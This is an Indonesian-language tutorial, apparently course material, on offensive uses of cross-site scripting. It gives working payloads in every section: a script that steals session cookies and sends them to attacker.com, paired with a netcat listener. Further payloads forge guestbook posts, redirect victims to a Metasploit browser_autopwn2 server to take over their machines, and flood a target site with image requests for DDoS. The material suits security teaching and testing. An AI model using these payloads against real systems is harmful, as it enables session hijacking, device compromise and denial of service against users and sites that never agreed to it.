# XSS Attack

Serangan XSS bisa dipergunakan untuk berbagai banyak hal, meski terlihat sederhana. Namun celah ini bisa dianggap memiliki tingkat keparahan tinggi jika kita mampu membuktikan celah tersebut berbahaya. Pada materi ini kita akan membahas beberapa contoh payload XSS untuk beberapa tujuan.

## **Steal Cookie (Bypass Authentication)**

Cookie adalah potongan kecil informasi yang disimpan situs web di komputer kalian. Cookie hanya mengandung teks. Teks dapat berupa ID pengguna, ID sesi, atau teks lainnya. Misalnya, halaman web memiliki opsi beberapa bahasa, ketika kalian memilih bahasa indonesia maka data tersebut disimpan ke browser. Dengan demikian ketika suatu hari mengunjungi situs itu lagi halaman akan langsung menyesuaikan ke bahasa indonesia.

Nah, pada javascript syntax **document.cookie** bisa digunakan untuk mendapatkan data cookie pada domain yang saat ini diakses. Dengan mengkombinasikan XSS kita bisa mendapatkan data cookie milik pengguna. Apabila dalam cookie terdapat ID sesi, kita bisa menggunakan ID sesi tersebut untuk melewati proses autentikasi (login tanpa mengetahui username dan password).

```bash
<script>var cookie = document.cookie; document.write('<img src="http://attacker.com/?payload=' + cookie + ' "/> '); </script>
```

Keterangan :

- http://attacker.com merupakan situs yang dimiliki penyerang untuk menerima cookie yang dikirim oleh browser pengguna
- Jika kalian tidak memiliki situs, kalian bisa menggunakan perintah **nc -lvp 80** untuk dan mengganti attacker.com dengan IP address kalian

## **Force Browser to do Malicious Act (XSS + CSRF)**

Untuk vektor serangan selanjutnya kita akan membuat malicious script untuk memaksa browser mengisi guestbook. Sebenarnya jenis serangan ini seperti mengkombinasikan antara celah XSS dan CSRF. Namun untuk lebih detail mengenai CSRF akan kita diskusikan di pertemuan yang lain.

```bash
<script>
var xhr = new XMLHttpRequest();
var data = new FormData();
data.append('txtName', 'Hacker');
data.append('mtxMessage', 'You have been hacked');
data.append('btnSign','Sign Guestbook');

xhr.open('POST', '/vulnerabilities/xss_s/', true);
xhr.send(data);
</script>
```

## **Compromise User Device (Browser Exploit)**

Selain memaksa browser untuk melakukan aksi berbahaya tanpa sepengetahuan penggunanya. Kali ini berbeda, kita menyisipkan malicious script yang memaksa pengguna untuk beralih ke situs lain yang didalamnya terdapat exploit browser.

Catatan:

1. Serangan ini tergantung dari browser yang digunakan pengguna
2. Apabila browser pengguna memiliki celah dan exploit tersedia didalam metasploit maka kita bisa mengambil alih komputer pengguna tersebut

```bash
$ msfconsole
msf >  use auxiliary/server/browser_autopwn2
msf > set SRVHOST 0.0.0.0
msf > set SRVPORT 8080
msf > set URIPATH /
msf > run
```

Jalankan perintah diatas pada kali linux anda, dengan demikian metasploit akan dalam mode listener atau menunggu hingga ada browser yang mengakses IP address anda pada port 8080.

Nah, jika anda memiliki IP Public maka pengguna akan bisa mengakses exploit tersebut via internet.

Untuk bisa memaksa pengguna mengakses web dari metasploit tersebut kita bisa memanfaatkan XSS dengan script dibawah ini :

```bash
<**script**>window.location="http://ip-attacker:8080";</**script**>
```

## **Force User to do DDOS another Server**

Ini juga menarik, ternyata dengan XSS kita bisa menyuntikan malicious script yang di program untuk membanjiri request ke situs yang sudah kita atur sebelumnya. Jika malicious script itu diakses oleh banyak pengguna maka akan banyak pula request yang dikirimkan ke situs tujuan.

Membanjiri permintaan dengan banyak komputer zombie sering dikenal dengan serangan Distributed Denial Of Services. Akibat dari serangan DDOS yang membanjiri bandwidth ini menyebabkan situs menjadi tidak bisa melayani pengguna lagi.

Berikut contoh javascript yang bisa kita suntikkan dengan XSS guna melakukan serangan DDOS :

```bash
<script>
function imgflood() {
  var TARGET = 'victim-website.com'
  var URI = '/index.php?'
  var pic = new Image()
  var rand = Math.floor(Math.random() * 1000)
  pic.src = 'http://'+TARGET+URI+rand+'=val'
}
setInterval(imgflood, 10)
</script>
```